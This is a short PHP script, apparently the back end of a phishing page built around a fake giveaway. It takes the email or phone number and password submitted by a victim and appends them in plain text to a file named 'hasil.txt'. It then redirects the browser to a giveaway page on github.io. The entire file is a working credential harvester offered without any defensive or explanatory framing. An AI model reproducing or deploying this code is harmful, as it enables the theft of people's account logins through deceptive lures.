<?php
header ("Location: https://giveawayberbagi.github.io/giveawayberbagi2023/FormMasuk.html");
$ADEx = "hasil.txt";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>

